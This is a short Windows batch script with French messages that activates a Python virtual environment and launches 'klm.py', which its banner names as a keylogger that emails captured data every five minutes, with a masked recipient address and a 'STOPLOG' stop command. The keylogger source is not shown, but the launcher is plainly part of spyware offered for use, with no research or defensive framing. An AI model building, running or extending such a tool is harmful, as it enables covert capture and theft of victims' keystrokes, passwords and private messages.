@echo off
chcp 65001 >nul
cd /d "%~dp0"
echo Activation de l'environnement virtuel...
call "..\.venv\Scripts\activate.bat"

echo.
echo ========================================
echo   KEYLOGGER AVEC ENVOI EMAIL
echo ========================================
echo Email: ****
echo Intervalle: 5 minutes
echo Pour arrêter: Tapez STOPLOG
echo ========================================
echo.

python klm.py

pause